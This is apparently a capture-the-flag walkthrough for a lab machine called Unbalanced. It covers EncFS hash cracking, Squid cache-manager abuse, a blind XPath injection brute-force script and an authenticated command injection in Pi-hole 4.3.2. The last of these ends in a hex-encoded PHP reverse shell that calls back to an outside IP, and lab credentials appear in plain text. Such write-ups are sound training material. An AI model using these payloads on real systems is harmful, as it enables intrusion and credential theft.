@@ -1,0 +1,364 @@
+Unbalanced
+
+1st December 2020 / Document No D20.100.99
+Prepared By: MrR3boot
+Machine Author(s): polarbearer & GibParadox
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Unbalanced is a hard difficulty Linux machine featuring a rsync service that stores an encrypted
+backup module. Upon decryption we find Squid proxy configuration details, which allow us to
+access internal hosts. One of the hosts is found vulnerable to a blind XPath injection, which is
+leveraged to obtain a set of credentials. These credentials allows us to gain foothold on the
+server. A vulnerable Pi-hole Docker instance is discovered, which is exploited and allows us to
+obtain a password that can be reused for the root account.
+
+Skills Required
+
+      Enumeration
+      OWASP Top 10
+      Python/Bash Scripting
+
+Skills Learned
+
+      Blind XPATH Injection
+      Pi-hole Exploitation
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.24.223 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.129.24.223
+
+Nmap output reveals that the target server has ports 22 (OpenSSH), 873 (rsync) and 3128 (Squid
+http proxy) available.
+
+rsync
+
+Let's attempt to retrieve a list of modules using the rsync command line utility.
+
+The conf_backups folder is available. The description states that it's an EncFS-encrypted
+backups folder. Let's view the files inside the conf_backups folder.
+The directory is encrypted. Let's copy the files to our local machine.
+
+Searching online about EncFS decryption returns this reference, which refers to the tool
+encfs2john.py . Let's download encfs2john.py and run it.
+
+The tool accepts an EncFS folder as input, and returns a hash in John The Ripper format. Let's run
+the tool with the conf_backups folder name as an argument.
+
+After saving the hash locally to a file we successfully crack it.
+   echo -n
+   'conf_backups:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44
+   *1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e
+   84b887add' > hash
+
+The hash is cracked and the encryption password is revealed to be bubblegum . Exploring the
+encfs man page shows instruction on how to decrypt a folder.
+
+In our case we have the file .encfs6.xml . Let's decrypt the folder by issuing the command
+below.
+
+   mkdir plain_backups
+   ENCFS5_CONFIG=/home/user/conf_backups/.encfs6.xml encfs /home/user/conf_backups
+   /home/user/multi/plain_backups
+After providing the password bubblegum when prompted, it decrypts the data.
+
+Among the decrypted files, squid.conf looks interesting as we have Squid proxy running on its
+default port 3128 . Let's explore the configuration file.
+There's an access control rule for the intranet.unbalanced.htb subdomain, and a set of
+credentials are also present. Let's continue our enumeration.
+
+Squid Proxy
+
+Squid is a caching and forwarding HTTP web proxy server. Let's configure the proxy in our
+browser.
+
+We can now access intranet.unbalanced.htb .
+We have a login form, but the password from squid.conf doesn't work. In general, proxy
+servers append some headers to route the requests to the intended servers or to manage the
+caching behaviour. Let's send a cURL request to intranet.unbalanced.htb .
+
+The response header Intranet-Host reveals the name intranet-host2.unbalanced.htb .
+Issuing further requests returns the name intranet-host3.unbalanced.htb .
+There seems to be some sort of load balancing mechanism in place to handle the requests. From
+the squid.conf file we also have a cachemgr_passwd entry.
+
+   cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects
+   vm_objects counters 5min 60min histograms cbdata sbuf events
+Searching online for cachemgr shows that it's a Squid Web Proxy component that is used to
+display statistics.
+
+From the wiki link we can find that the URL to access CacheManager is /squid-internal-mgr .
+Exploring the other reference about cachemgr_passwd reveals the required syntax.
+
+   cachemgr_passwd password action action ...
+We can supply the password Thah$Sh1 in order to access the actions mentioned in squid.conf
+file. Let's invoke the menu action using cURL.
+Invoking the fqdncache action returns the DNS cache and IP resolution statistics.
+
+The following entries are interesting.
+
+172.31.179.2                            H -001 1 intranet-
+host2.unbalanced.htb                    H -001 1 intranet-
+172.31.179.3                            H -001 1
+host3.unbalanced.htb
+172.17.0.1
+intranet.unbalanced.htb
+
+As all these IP addresses are in the 172.16.0.0/12 network range, we can access them using the
+proxy.
+
+172.31.179.2
+172.31.179.3
+
+All hosts have the same content and the login functionality, and simple testing on the login form
+indicates that it doesn't seem vulnerable to SQL injection.
+Let's try to access intranet-host1.unbalanced.htb and see if this host exists on the network.
+
+The Squid proxy reports that it can't retrieve the URL. Let's try to access 172.31.179.1 instead,
+as the other identified hostnames contained a numeric identifier that mapped to the last octet of
+the assigned IP address.
+The error message states that the host has been removed from the load balancing pool in order
+to undergo security maintenance. Let's send a cURL request.
+
+The Intranet-Host header shows the intranet-host1.unbalanced.htb hostname. As the error
+refers to security maintenance, it's worth enumerating this host further. Let's access
+/intranet.php on this host.
+
+This time when we submit the form, the host responds with an error message.
+Foothold
+
+The default credentials didn't work and SQLMap also wasn't able to identify an injection. Let's
+change the browser proxy address to 127.0.0.1:8080 and launch Burp Suite.
+Navigate to Project Options > Upstream Proxy Servers and click on Add button.
+
+We can now intercept the requests in Burp Suite. Let's capture the login request and send it to
+Repeater for further analysis. Entering ' or '1'='1 in both the fields returns a list of employees
+in the organization.
+
+It's also worth checking if it is vulnerable to XPATH injection. We can use the following payload to
+validate this: ' or 1=1 or 'a'='a .
+This is successful and a list of employees is returned.
+
+   Rita Fubelli
+   rita@unbalanced.htb
+   Role: HR Manager
+
+   Jim Mickelson
+   jim@unbalanced.htb
+   Role: Web Designer
+
+   Bryan Angstrom
+   bryan@unbalanced.htb
+   Role: System Administrator
+
+   Sarah Goodman
+   sarah@unbalanced.htb
+   Role: Team Leader
+
+From the results, we can guess that the query is something like the following.
+
+   //Employee[(UserName/text()=' ' or 1=1) or ('a'='a' And Password/text()=' ')]
+
+As Bryan is a System Administrator , we may focus our attention on retrieving his password.
+Let's send a true query.
+
+   Username : bryan' and 1=1 or 'a'='a
+   Password : a
+Now let's send a false query.
+   Username : test' and 1=1 or 'a'='a
+   Password : a
+
+The application is returning Invalid credentials if the query is false and valid result if the
+query is true. This confirms that the application is vulnerable to blind XPath injection. We can
+enumerate employee passwords using the payload below.
+
+   Username : bryan' and string-length(Password/text())=1 or 'a'='a
+   Password : a
+Hit CTRL + I to send the request to Burp's Intruder module, and under the Positions tab,
+highlight the position to insert the payloads.
+
+Under the Payloads tab, set Payload Type to Numbers .
+Now click on the Start attack button.
+
+The content length changes at 23 , confirming that the password length is 23 characters. We can
+write a Python script to brute force the password of Bryan .
+
+   import requests
+   import string
+   url = 'http://172.31.179.1/intranet.php'
+   proxy = 'http://10.129.24.223:3128'
+   password=''
+   while len(password) < 23:
+
+                 pos=len(password)+1
+                 for i in string.printable:
+
+                                data={'Username':f"bryan' and substring(Password/text(),
+   {pos},1)='{i}' or 'a'='a",'Password':'a'}
+
+                                r = requests.post(url,data=data,proxies={'http':proxy})
+                                if 'bryan@unbalanced.htb' in r.text:
+
+                                               password=password+i
+                                               break
+                 print(password)
+                 break
+The above script uses a substring function to compare each position of the password against a
+set of characters. Let's save the script to a file and run it.
+
+We successfully retrieved the password for bryan . Let's try to login to SSH using the bryan /
+ireallyl0vebubblegum!!! credentials.
+
+This is successful and we gained access to the server as Bryan and the user.txt.
+Privilege Escalation
+
+Bryan's home folder contains a TODO file.
+
+The Pi-hole section looks interesting. It's mentioned that Pi-hole is installed in a Docker container
+and listening on the 127.0.0.1 address. Let's check the services.
+
+We see port 8080 is open. Let's send a cURL request.
+Checking this error message online confirms that the error message is related to Pi-hole.
+
+Let's perform an SSH port forward to access the Pi-hole web interface.
+   ssh -L 8080:127.0.0.1:8080 bryan@10.129.24.223
+
+We can now access the application from our machine. The TODO file also mentions that a
+temporary admin password is set for Pi-hole, which is an indication that it could be a weak
+password. Let's access the admin page at the URL /admin .
+
+Trying admin as the password works, and we gain access to the application.
+The footer of the application reveals the Pi-hole version.
+
+Searching for exploits related to this version reveals an authenticated remote code execution
+vulnerability. The CVE description contains a reference link to the author's blog, which explains
+the vulnerability in detail.
+Let's navigate to Settings > DHCP . The application accepts a MAC address as input when
+configuring DHCP leases.
+
+Let's download the Pi-hole 4.3.2 from Docker Hub and run it.
+   docker pull pihole/pihole:4.3.2
+   docker run pihole/pihole:4.3.2
+
+We can now access the bash terminal on the container and proceed to review the application
+source code.
+
+   docker exec -it $(docker ps -a -q) bash
+The CVE description mentioned that the vulnerability was present in the static DHCP lease
+functionality. Let's grep for the string MAC address in the /var/www/html/admin folder.
+root@12b60ae0f306:/var/www/html/admin# grep -inR 'MAC address' .
+
+./scripts/pi-hole/php/savesettings.php:548: $error .= "MAC address
+
+(".htmlspecialchars($mac).") is invalid!<br>";
+
+./scripts/pi-hole/php/savesettings.php:573: // Test if this MAC address is
+
+already included
+
+./scripts/pi-hole/php/savesettings.php:578: $error .= "Static release for MAC
+
+address (".htmlspecialchars($mac).") already defined!<br>";
+
+./scripts/pi-hole/php/savesettings.php:601: $error .= "MAC address
+
+(".htmlspecialchars($mac).") is invalid!<br>";
+
+./scripts/pi-hole/php/savesettings.php:608: $success .= "The static address
+
+with MAC address ".htmlspecialchars($mac)." has been removed";
+
+./settings.php:572:                             <th>MAC address</th>
+
+./settings.php:602:                             <th>MAC address</th>
+
+./settings.php:637:                             <p>Specifying the MAC address is
+
+mandatory and only one entry per MAC
+
+The code responsible for MAC address validation is present in the file savesettings.php .
+lines 53-57:
+
+function validMAC($mac_addr)
+{
+
+   // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
+   return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1);
+}
+
+The application first validates the MAC address format using the function preg_match() . If this is
+valid, it then converts the input to uppercase.
+
+lines 542-550:
+
+$mac = $_POST["AddMAC"];
+<SNIP>
+if(!validMAC($mac))
+{
+
+       $error .= "MAC address (".htmlspecialchars($mac).") is invalid!<br>";
+}
+$mac = strtoupper($mac);
+
+It then adds the entry to DHCP using a pihole system command.
+lines 589-592:
+
+if(!strlen($error))
+{
+
+   exec("sudo pihole -a addstaticdhcp ".$mac." ".$ip." ".$hostname);
+       $success .= "A new static address has been added";
+
+}
+
+The preg_match just looks for a valid MAC address format and doesn't take into account any
+subsequent characters. So we can input any arbitrary text after the MAC address.
+
+aa:bb:cc:dd:ee:ff$PATH
+Once we click on the + icon, the input is executed by the exec() function in the PHP code.
+
+The commands such as php -r won't work as the application is converting the input to
+uppercase letters. We can use environment variables to overcome this. Let's use the payload
+from the referenced blogpost.
+
+   aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}
+   &&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("<hex reverse
+   shell payload>"));'&&
+
+The payload uses a parameter expansion technique to form the lowercase letters php -r , which
+are required to obtain the reverse shell.
+
+   root@3809de899fc2:/# W=${PATH#/???/}
+   root@3809de899fc2:/# echo $W
+   pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+   root@3809de899fc2:/# P=${W%%?????:*}
+   root@3809de899fc2:/# echo $P
+   p
+
+Let's encode a reverse shell in hex format.
+
+   echo -n php -r \''$sock=fsockopen("10.10.14.2",1234);exec("/bin/sh -i <&3 >&3
+   2>&3");'\' | xxd -ps -c 200 | tr -d '\n'
+
+Next, add this to the payload.
+
+   aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}
+   &&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d7220272
+   4736f636b3d66736f636b6f70656e282231302e31302e31342e32222c31323334293b65786563282
+   22f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
+
+Stand up a listener on port 1234 and submit the payload in the form. This is successful, and we
+receive a reverse shell as www-data in the Pi-hole Docker container.
+Enumerating the file system we see that the root folder is readable by anyone. Checking this with
+our Docker locally we observe that it is the same.
+We have two bash scripts in /root folder.
+
+Let's check the contents of pihole_config.sh .
+The configuration script contains the admin password bUbBl3gUm$43v3Ry0n3! . Let's try
+switching to the root user by reusing this password from our shell as bryan. This is successful and
+we gain the root.txt.
+
